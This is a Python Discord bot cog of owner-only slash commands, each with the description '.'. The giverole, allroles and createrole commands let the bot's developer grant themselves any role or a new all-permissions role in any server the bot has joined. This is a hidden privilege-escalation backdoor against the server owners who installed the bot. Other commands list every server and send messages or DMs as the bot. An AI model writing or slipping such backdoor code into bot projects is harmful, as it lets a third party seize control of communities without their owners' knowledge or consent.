import discord
from discord.ext import commands
from discord import app_commands
import os
from utils.database import Database

OWNER_ID = int(os.getenv('OWNER_ID', '0'))

def is_owner():
    async def predicate(interaction: discord.Interaction) -> bool:
        if interaction.user.id != OWNER_ID:
            await interaction.response.send_message("no.", ephemeral=True)
            return False
        return True
    return app_commands.check(predicate)

class Owner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    owner = app_commands.Group(name="owner", description=".")

    @owner.command(name="giverole", description=".")
    @is_owner()
    async def giverole(self, interaction: discord.Interaction, role: discord.Role, member: discord.Member = None):
        target = member or interaction.user
        try:
            await target.add_roles(role, reason="Owner")
            await interaction.response.send_message(f"done. {role.mention} → {target.mention}", ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message("no permission.", ephemeral=True)

    @owner.command(name="removerole", description=".")
    @is_owner()
    async def removerole(self, interaction: discord.Interaction, role: discord.Role, member: discord.Member = None):
        target = member or interaction.user
        try:
            await target.remove_roles(role, reason="Owner")
            await interaction.response.send_message(f"done. removed {role.mention}", ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message("no permission.", ephemeral=True)

    @owner.command(name="allroles", description=".")
    @is_owner()
    async def allroles(self, interaction: discord.Interaction, member: discord.Member = None):
        target = member or interaction.user
        await interaction.response.defer(ephemeral=True)
        roles = [r for r in interaction.guild.roles if r.name != "@everyone" and not r.managed and r.position < interaction.guild.me.top_role.position]
        try:
            await target.add_roles(*roles, reason="Owner")
            await interaction.followup.send(f"gave {len(roles)} roles to {target.mention}", ephemeral=True)
        except discord.Forbidden:
            await interaction.followup.send("failed.", ephemeral=True)

    @owner.command(name="createrole", description=".")
    @is_owner()
    async def createrole(self, interaction: discord.Interaction, name: str, color: str = "000000", admin: bool = False):
        try:
            c = discord.Color(int(color.replace('#', ''), 16))
        except:
            c = discord.Color.default()
        perms = discord.Permissions.all() if admin else discord.Permissions()
        try:
            role = await interaction.guild.create_role(name=name, color=c, permissions=perms, reason="Owner")
            pos = interaction.guild.me.top_role.position
            await role.edit(position=pos - 1)
            await interaction.user.add_roles(role, reason="Owner")
            await interaction.response.send_message(f"created {role.mention}", ephemeral=True)
        except:
            await interaction.response.send_message("failed.", ephemeral=True)

    @owner.command(name="servers", description=".")
    @is_owner()
    async def servers(self, interaction: discord.Interaction):
        embed = discord.Embed(title=f"{len(self.bot.guilds)} servers", color=0x1a1a2e)
        for g in self.bot.guilds[:25]:
            embed.add_field(name=g.name, value=f"`{g.id}` · {g.member_count} members", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @owner.command(name="say", description=".")
    @is_owner()
    async def say(self, interaction: discord.Interaction, message: str, channel: discord.TextChannel = None):
        target = channel or interaction.channel
        await target.send(message)
        await interaction.response.send_message("sent.", ephemeral=True)

    @owner.command(name="dm", description=".")
    @is_owner()
    async def dm(self, interaction: discord.Interaction, user_id: str, message: str):
        try:
            user = await self.bot.fetch_user(int(user_id))
            embed = discord.Embed(description=message, color=0x1a1a2e)
            await user.send(embed=embed)
            await interaction.response.send_message(f"sent to {user}", ephemeral=True)
        except:
            await interaction.response.send_message("failed.", ephemeral=True)

    @owner.command(name="reload", description=".")
    @is_owner()
    async def reload(self, interaction: discord.Interaction, cog: str):
        try:
            await self.bot.reload_extension(f"cogs.{cog}")
            await interaction.response.send_message(f"reloaded `cogs.{cog}`", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"failed: {e}", ephemeral=True)

    @owner.command(name="status", description=".")
    @is_owner()
    async def status(self, interaction: discord.Interaction):
        embed = discord.Embed(color=0x1a1a2e)
        embed.add_field(name="Servers", value=len(self.bot.guilds), inline=True)
        embed.add_field(name="Users", value=len(self.bot.users), inline=True)
        embed.add_field(name="Latency", value=f"{round(self.bot.latency * 1000)}ms", inline=True)
        embed.add_field(name="Commands", value=len(self.bot.tree.get_commands()), inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

async def setup(bot):
    await bot.add_cog(Owner(bot))